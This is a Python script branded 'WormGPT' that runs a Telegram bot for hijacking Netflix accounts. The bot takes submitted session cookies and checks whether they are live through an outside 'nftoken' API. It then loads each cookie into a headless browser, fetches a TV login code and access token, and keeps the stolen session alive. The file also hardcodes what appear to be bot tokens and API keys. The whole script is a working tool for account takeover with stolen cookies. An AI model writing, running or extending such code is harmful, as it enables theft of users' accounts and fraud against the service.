#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WormGPT – Netflix TV-login + Cookie validator via Telegram
python nftv.py
"""
import os, sys, subprocess, asyncio, json, base64, time, aiohttp
def install(p): subprocess.check_call([sys.executable,"-m","pip","install","-q",p])
try:
    import pyrogram, requests as r, pyppeteer, dotenv
except ImportError:
    for pkg in ["pyrogram","requests","pyppeteer","python-dotenv"]:
        install(pkg)
    print("Deps installed – restart script.")
    sys.exit(0)

from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import MessageNotModified
from dotenv import load_dotenv
load_dotenv()

BOT_TOKEN  = os.getenv("BOT_TOKEN","8477278414:AAE9Tjb_wHbdalyTEb1CikHg29QRhwn-xNY")
NFT_KEY    = os.getenv("NFTOKEN_KEY","NFK_dda3ee3932171d33d94067e3")
NFT_URL    = "https://nftoken.site/v1/api.php"
TV_URL     = "https://www.netflix.com/tv8"

app = Client("nftv", api_id=2040, api_hash="b18441a1ff607e10a8918913a8ed6624", bot_token=BOT_TOKEN)

# ---------- helpers ----------
def nft(cookie): return r.post(NFT_URL, json={"key":NFT_KEY,"cookie":cookie}, timeout=10).json()

def parse_cookie(cstr):
    return [{"name":x.split("=")[0].strip(),"value":x.split("=",1)[1],
             "domain":".netflix.com","path":"/"} for x in cstr.split(";") if "=" in x]

async def get_tv_code(cookie: str):
    browser = await pyppeteer.launch(headless=True, args=['--no-sandbox','--disable-dev-shm-usage'])
    page = await browser.newPage()
    await page.setCookie(*parse_cookie(cookie))
    await page.goto(TV_URL, {"waitUntil":"networkidle2"})
    await page.waitForSelector('input[data-uia="tv-code-input"]', {"timeout":8000})
    code = await page.evaluate('() => document.querySelector("input[data-uia=\'tv-code-input\']").value')
    # keep session alive
    asyncio.create_task(keep_alive(page))
    return code, page, browser

async def keep_alive(page):
    while True:
        try:
            await page.goto("https://netflix.com/browse", {"waitUntil":"networkidle2","timeout":5000})
        except: pass
        await asyncio.sleep(30)

async def wait_for_token(page, cookie):
    while True:
        await asyncio.sleep(5)
        try:
            nm = nft(cookie)
            if nm.get("accessToken"):
                return nm["accessToken"]
        except: pass

# ---------- handlers ----------
@app.on_message(filters.command("start"))
async def start(_, m: Message):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📺 TV Login", callback_data="tv")],
        [InlineKeyboardButton("🔍 Cookie Check", callback_data="chk")]
    ])
    await m.reply("🍿 Netflix Tool\nChoose:", reply_markup=kb)

@app.on_callback_query(filters.regex("^tv$"))
async def tv(_, cq):
    await cq.message.edit("Send me a Netflix cookie:")
    @app.on_message(filters.text & ~filters.command("") & filters.private, group=1)
    async def got_tv(_, m: Message):
        app.remove_handler(*got_tv.handlers[0])
        ck = m.text.strip()
        if not nft(ck).get("status"):
            return await m.reply("❌ Dead cookie.")
        await m.reply("🔄 Fetching TV code…")
        code, page, browser = await get_tv_code(ck)
        await m.reply(f"📺 TV Code: `{code}`\n\nEnter this on your TV.\nWaiting for link…")
        token = await wait_for_token(page, ck)
        await browser.close()
        await m.reply(f"✅ AccessToken:\n`{token}`")

@app.on_callback_query(filters.regex("^chk$"))
async def chk(_, cq):
    await cq.message.edit("Send cookie for NFToken check:")
    @app.on_message(filters.text & ~filters.command("") & filters.private, group=2)
    async def got_chk(_, m: Message):
        app.remove_handler(*got_chk.handlers[0])
        ck = m.text.strip()
        nm = nft(ck)
        if not nm.get("status"):
            return await m.reply("❌ NFToken says dead.")
        await m.reply("🔄 Logging in…")
        browser = await pyppeteer.launch(headless=True, args=['--no-sandbox','--disable-dev-shm-usage'])
        page = await browser.newPage()
        await page.setCookie(*parse_cookie(ck))
        await page.goto("https://netflix.com/browse", {"waitUntil":"networkidle2"})
        await page.waitForSelector('[data-uia="nmhp-card-hero"]', {"timeout":8000})
        png = await page.screenshot({"fullPage":True, "type":"png"})
        await browser.close()
        await app.send_photo(m.chat.id, png, caption=f"✅ Live cookie – NFToken:\n`{json.dumps(nm, indent=2)}`")

# ---------- runner ----------
async def main():
    await app.start()
    print("🤖 Netflix TV+Cookie bot running…")
    await pyrogram.idle()
    await app.stop()

if __name__ == "__main__":
    asyncio.run(main())
